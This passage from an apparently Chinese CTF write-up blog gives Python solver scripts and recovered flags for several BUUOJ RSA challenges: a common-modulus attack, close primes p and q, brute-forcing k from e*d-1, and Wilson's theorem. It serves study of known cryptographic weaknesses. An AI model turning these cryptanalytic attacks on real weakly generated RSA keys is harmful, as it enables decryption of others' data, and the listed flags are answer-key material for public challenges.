class="token number">21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111</span>e1 <span class="token operator">=</span> <span class="token number">2767</span>e2 <span class="token operator">=</span> <span class="token number">3659</span>c1 <span class="token operator">=</span> <span class="token number">20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599</span>c2 <span class="token operator">=</span> <span class="token number">11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227</span><span class="token keyword">def</span> <span class="token function">ext_euclid</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> b <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> a    <span class="token keyword">else</span><span class="token punctuation">:</span>        x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> q <span class="token operator">=</span> ext_euclid<span class="token punctuation">(</span>b<span class="token punctuation">,</span> a <span class="token operator">%</span> b<span class="token punctuation">)</span>  <span class="token comment"># q = gcd(a, b) = gcd(b, a%b)</span>        x<span class="token punctuation">,</span> y <span class="token operator">=</span> y<span class="token punctuation">,</span> <span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token punctuation">(</span>a <span class="token operator">//</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> y<span class="token punctuation">)</span>        <span class="token keyword">return</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> qs<span class="token punctuation">,</span> t<span class="token punctuation">,</span> q <span class="token operator">=</span> ext_euclid<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> s<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> t<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> n <span class="token comment"># powmod进行大数运算</span>flag <span class="token operator">=</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'BJD&#123;r3a_C0mmoN_moD@_4ttack&#125;'</span><span class="token comment"># flag&#123;r3a_C0mmoN_moD@_4ttack&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="13-RSA共模攻击-SameMod"><a href="#13-RSA共模攻击-SameMod" class="headerlink" title="13.RSA共模攻击-SameMod"></a>13.RSA共模攻击-SameMod</h2><p>一看名字就知道是共模攻击了，老脚本派上用场了，没啥分析的。</p><p>数据给出如下:</p><pre class="line-numbers language-data" data-language="data"><code class="language-data">&#123;6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,773&#125;&#123;6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,839&#125;message1&#x3D;3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349message2&#x3D;5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>脚本如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># -----------------------------------------------------</span><span class="token comment"># @Author  : M4XLMUM                                  </span><span class="token comment"># @website : http://a16n.github.io</span><span class="token comment"># -----------------------------------------------------</span><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnumn <span class="token operator">=</span> <span class="token number">6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249</span>e1 <span class="token operator">=</span> <span class="token number">773</span>e2 <span class="token operator">=</span> <span class="token number">839</span>c1 <span class="token operator">=</span> <span class="token number">3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349</span>c2 <span class="token operator">=</span> <span class="token number">5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535</span><span class="token keyword">def</span> <span class="token function">ext_euclid</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> b <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> a    <span class="token keyword">else</span><span class="token punctuation">:</span>        x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> q <span class="token operator">=</span> ext_euclid<span class="token punctuation">(</span>b<span class="token punctuation">,</span> a <span class="token operator">%</span> b<span class="token punctuation">)</span>  <span class="token comment"># q = gcd(a, b) = gcd(b, a%b)</span>        x<span class="token punctuation">,</span> y <span class="token operator">=</span> y<span class="token punctuation">,</span> <span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token punctuation">(</span>a <span class="token operator">//</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> y<span class="token punctuation">)</span>        <span class="token keyword">return</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> qs<span class="token punctuation">,</span> t<span class="token punctuation">,</span> q <span class="token operator">=</span> ext_euclid<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> s<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> t<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> n <span class="token comment"># powmod进行大数运算</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token comment"># 发现hex的结果并不对，原来加密的时候用的是ascii。。。手动分开</span><span class="token comment"># m = 102 108 97 103 123 119 104 101 110 119 101 116 104 105 110 107 105 116 105 115 112 111 115 115 105 98 108 101 125</span>m <span class="token operator">=</span> <span class="token string">'102 108 97 103 123 119 104 101 110 119 101 116 104 105 110 107 105 116 105 115 112 111 115 115 105 98 108 101 125'</span><span class="token comment"># flag = libnum.n2s(int(m))</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> m<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># flag&#123;whenwethinkitispossible&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题跟上面的不同的一点就是这个解出来的明文不是进行的hex的变换，而是ascii。</p><h2 id="14-RSA生成素数p、q相距很近；解方程组sympy库-GWCTF-2019-BabyRSA"><a href="#14-RSA生成素数p、q相距很近；解方程组sympy库-GWCTF-2019-BabyRSA" class="headerlink" title="14.RSA生成素数p、q相距很近；解方程组sympy库-[GWCTF 2019]BabyRSA"></a>14.RSA生成素数p、q相距很近；解方程组sympy库-[GWCTF 2019]BabyRSA</h2><p>这里给出的数据时N与加密后的数据，指数e也给出了，那就直接分解N得p、q。factordb.com就能出，直接在线解了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">p<span class="token operator">=</span><span class="token number">797862863902421984951231350430312260517773269684958456342860983236184129602390919026048496119757187702076499551310794177917920137646835888862706126924088411570997141257159563952725882214181185531209186972351469946269508511312863779123205322378452194261217016552527754513215520329499967108196968833163329724620251096080377747699</span>q<span class="token operator">=</span><span class="token number">797862863902421984951231350430312260517773269684958456342860983236184129602390919026048496119757187702076499551310794177917920137646835888862706126924088411570997141257159563952725882214181185531209186972351469946269508511312863779123205322378452194261217016552527754513215520329499967108196968833163329724620251096080377748737</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以看到两个数只差了不到一千而已。</p><p>注意到后面有个解方程组的。。。因为flag被分成了两部分，分别做了两个运算，这时候python还有一个专门的库针对解方程组。。。果然python出了不能帮你生孩子，其他的都能帮你做。。。库名为sympy，tql。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""import hashlib# import sympyfrom Cryptodome.Util.number import *flag = 'GWHT&#123;******&#125;'secret = '******'assert(len(flag) == 38)half = len(flag) / 2flag1 = flag[:half]flag2 = flag[half:]secret_num = getPrime(1024) * bytes_to_long(secret)p = sympy.nextprime(secret_num)q = sympy.nextprime(p)N = p * qe = 0x10001F1 = bytes_to_long(flag1)F2 = bytes_to_long(flag2)c1 = F1 + F2c2 = pow(F1, 3) + pow(F2, 3)assert(c2 &lt; N)m1 = pow(c1, e, N)m2 = pow(c2, e, N)output = open('secret', 'w')output.write('N=' + str(N) + '\n')output.write('m1=' + str(m1) + '\n')output.write('m2=' + str(m2) + '\n')output.close()"""</span><span class="token keyword">import</span> sympy<span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnume <span class="token operator">=</span> <span class="token number">0x10001</span>N <span class="token operator">=</span> <span class="token number">636585149594574746909030160182690866222909256464847291783000651837227921337237899651287943597773270944384034858925295744880727101606841413640006527614873110651410155893776548737823152943797884729130149758279127430044739254000426610922834573094957082589539445610828279428814524313491262061930512829074466232633130599104490893572093943832740301809630847541592548921200288222432789208650949937638303429456468889100192613859073752923812454212239908948930178355331390933536771065791817643978763045030833712326162883810638120029378337092938662174119747687899484603628344079493556601422498405360731958162719296160584042671057160241284852522913676264596201906163</span>c1 <span class="token operator">=</span> <span class="token number">90009974341452243216986938028371257528604943208941176518717463554774967878152694586469377765296113165659498726012712288670458884373971419842750929287658640266219686646956929872115782173093979742958745121671928568709468526098715927189829600497283118051641107305128852697032053368115181216069626606165503465125725204875578701237789292966211824002761481815276666236869005129138862782476859103086726091860497614883282949955023222414333243193268564781621699870412557822404381213804026685831221430728290755597819259339616650158674713248841654338515199405532003173732520457813901170264713085107077001478083341339002069870585378257051150217511755761491021553239</span>c2 <span class="token operator">=</span> <span class="token number">487443985757405173426628188375657117604235507936967522993257972108872283698305238454465723214226871414276788912058186197039821242912736742824080627680971802511206914394672159240206910735850651999316100014691067295708138639363203596244693995562780286637116394738250774129759021080197323724805414668042318806010652814405078769738548913675466181551005527065309515364950610137206393257148357659666687091662749848560225453826362271704292692847596339533229088038820532086109421158575841077601268713175097874083536249006018948789413238783922845633494023608865256071962856581229890043896939025613600564283391329331452199062858930374565991634191495137939574539546</span>p <span class="token operator">=</span> <span class="token number">797862863902421984951231350430312260517773269684958456342860983236184129602390919026048496119757187702076499551310794177917920137646835888862706126924088411570997141257159563952725882214181185531209186972351469946269508511312863779123205322378452194261217016552527754513215520329499967108196968833163329724620251096080377747699</span>q <span class="token operator">=</span> <span class="token number">797862863902421984951231350430312260517773269684958456342860983236184129602390919026048496119757187702076499551310794177917920137646835888862706126924088411570997141257159563952725882214181185531209186972351469946269508511312863779123205322378452194261217016552527754513215520329499967108196968833163329724620251096080377748737</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> d<span class="token punctuation">,</span> N<span class="token punctuation">)</span>m2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c2<span class="token punctuation">,</span> d<span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m1<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>m1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m2<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>m2<span class="token punctuation">)</span><span class="token punctuation">)</span>f1<span class="token punctuation">,</span> f2 <span class="token operator">=</span> sympy<span class="token punctuation">.</span>symbols<span class="token punctuation">(</span><span class="token string">'f1 f2'</span><span class="token punctuation">)</span>  <span class="token comment"># 引入符号</span>flag <span class="token operator">=</span> sympy<span class="token punctuation">.</span>solve<span class="token punctuation">(</span><span class="token punctuation">[</span>f1 <span class="token operator">+</span> f2 <span class="token operator">-</span> m1<span class="token punctuation">,</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>f1<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>f2<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">-</span> m2<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>f1<span class="token punctuation">,</span> f2<span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token comment"># 写入需要解的方程组，f1 + f2 = c1，pow(f1, 3) + pow(f2, 3) = c2</span>f1<span class="token punctuation">,</span> f2 <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>F1<span class="token punctuation">,</span> F2 <span class="token operator">=</span> <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>f1<span class="token punctuation">,</span> f2<span class="token punctuation">]</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> F1 <span class="token operator">+</span> F2<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'GWHT&#123;f709e0e2cfe7e530ca8972959a1033b2&#125;'</span><span class="token comment"># flag&#123;f709e0e2cfe7e530ca8972959a1033b2&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="RSA有c、d、e，并且p、q相距很近，爆破e-d-1-k-p-1-q-1-中的k-NCTF2019-babyRSA"><a href="#RSA有c、d、e，并且p、q相距很近，爆破e-d-1-k-p-1-q-1-中的k-NCTF2019-babyRSA" class="headerlink" title="RSA有c、d、e，并且p、q相距很近，爆破e*d-1=k*(p-1)*(q-1)中的k-[NCTF2019]babyRSA"></a>RSA有c、d、e，并且p、q相距很近，爆破<code>e*d-1=k*(p-1)*(q-1)</code>中的k-[NCTF2019]babyRSA</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Cryptodome<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnum<span class="token keyword">import</span> sympy<span class="token triple-quoted-string string">"""def nextPrime(n):    n += 2 if n &amp; 1 else 1  # 使n为奇数    while not isPrime(n):        n += 2    return np = getPrime(1024)q = nextPrime(p)n = p * qe = 0x10001d = inverse(e, (p-1) * (q-1))c = pow(bytes_to_long(flag.encode()), e, n)"""</span>e <span class="token operator">=</span> <span class="token number">0x10001</span>d <span class="token operator">=</span> <span class="token number">19275778946037899718035455438175509175723911466127462154506916564101519923603308900331427601983476886255849200332374081996442976307058597390881168155862238533018621944733299208108185814179466844504468163200369996564265921022888670062554504758512453217434777820468049494313818291727050400752551716550403647148197148884408264686846693842118387217753516963449753809860354047619256787869400297858568139700396567519469825398575103885487624463424429913017729585620877168171603444111464692841379661112075123399343270610272287865200880398193573260848268633461983435015031227070217852728240847398084414687146397303110709214913</span>c <span class="token operator">=</span> <span class="token number">5382723168073828110696168558294206681757991149022777821127563301413483223874527233300721180839298617076705685041174247415826157096583055069337393987892262764211225227035880754417457056723909135525244957935906902665679777101130111392780237502928656225705262431431953003520093932924375902111280077255205118217436744112064069429678632923259898627997145803892753989255615273140300021040654505901442787810653626524305706316663169341797205752938755590056568986738227803487467274114398257187962140796551136220532809687606867385639367743705527511680719955380746377631156468689844150878381460560990755652899449340045313521804</span><span class="token comment"># 有 c d e, 知道e*d = 1 % (p-1)*(q-1) 则e*d-1 = k * (p-1)*(q-1)</span><span class="token comment"># 可以爆破k要得到(p-1)*(q-1)</span><span class="token comment"># 取k的范围</span><span class="token comment"># e*d - 1是2063到2064位 、 (p-1)*(q-1)是1024+1024位</span><span class="token comment"># 则k取2^15~2^16</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token number">2</span> <span class="token operator">**</span> i <span class="token operator">&lt;</span> e <span class="token operator">*</span> d <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&lt;</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">break</span>        <span class="token comment"># 2063</span><span class="token comment"># (e*d-1)对k的模为0</span><span class="token comment"># 我们还知道q是p的下一个素数 俩者大小相差不大</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token operator">*</span> d <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> k <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> sympy<span class="token punctuation">.</span>prevprime<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span><span class="token punctuation">(</span>e <span class="token operator">*</span> d <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> k<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 通过sympy.prevprime(n)得到小于n的最大素数</span>        q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>p<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token operator">*</span> d <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> k<span class="token punctuation">:</span>            <span class="token comment"># 验证pq是否正确</span>            <span class="token keyword">break</span>n <span class="token operator">=</span> q <span class="token operator">*</span> p<span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># b'NCTF&#123;70u2_nn47h_14_v3ry_gOO0000000d&#125;'</span><span class="token comment"># flag&#123;70u2_nn47h_14_v3ry_gOO0000000d&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="RSA存在阶乘一般可能是威尔逊定理-RoarCTF2019-babyRSA"><a href="#RSA存在阶乘一般可能是威尔逊定理-RoarCTF2019-babyRSA" class="headerlink" title="RSA存在阶乘一般可能是威尔逊定理-[RoarCTF2019]babyRSA"></a>RSA存在阶乘一般可能是威尔逊定理-[RoarCTF2019]babyRSA</h2><p>这题看到取素因数p、q的时候用到了阶乘，我所学过的数论知识里，用到哪个不会哪个(我太菜了)，联想到威尔逊定理</p><p><strong>威尔逊定理</strong>: </p><script type="math/tex; mode=display">(p-1)! ☰ -1 \space (\bmod p)</script><p><strong>懒得写数学公式了，看看师傅写的</strong></p><p><img src="/2020/11/25/BUUOJ-crypto/image-20210505002337976.png" alt="公式分析"></p><p>代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sympy<span class="token keyword">import</span> libnum<span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> random<span class="token triple-quoted-string string">"""def myGetPrime():    A = getPrime(513)    print(A)    B = A - random.randint(1e3, 1e5)    print(B)    return sympy.nextPrime(B! % A)p = myGetPrime()# A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407# B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596q = myGetPrime()# A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927# B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026r = myGetPrime()n = p * q * r# n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733c = pow(flag, e, n)# e=0x1001# c=75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428# so,what is the flag?"""</span><span class="token keyword">def</span> <span class="token function">myCrackPrime</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span> B<span class="token punctuation">)</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># temp代表的就是前面的那一堆模A</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>B<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> A<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># B+1到A-2相乘并对A取模运算</span>        temp <span class="token operator">*=</span> i        temp <span class="token operator">%=</span> A    p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>temp<span class="token punctuation">,</span> A<span class="token punctuation">)</span>    <span class="token keyword">return</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>p<span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token number">75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428</span>e <span class="token operator">=</span> <span class="token number">0x1001</span>A1 <span class="token operator">=</span> <span class="token number">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span>B1 <span class="token operator">=</span> <span class="token number">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596</span>A2 <span class="token operator">=</span> <span class="token number">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span>B2 <span class="token operator">=</span> <span class="token number">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span>p <span class="token operator">=</span> myCrackPrime<span class="token punctuation">(</span>A1<span class="token punctuation">,</span> B1<span class="token punctuation">)</span>q <span class="token operator">=</span> myCrackPrime<span class="token punctuation">(</span>A2<span class="token punctuation">,</span> B2<span class="token punctuation">)</span>n <span class="token operator">=</span> p<span class="token operator">*</span>qphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>flag <span class="token operator">=</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'RoarCTF&#123;wm-CongrAtu1ation4-1t4-ju4t-A-bAby-R4A&#125;'</span><span class="token comment"># flag&#123;wm-CongrAtu1ation4-1t4-ju4t-A-bAby-R4A&#125;</span><span aria-hidden="true" 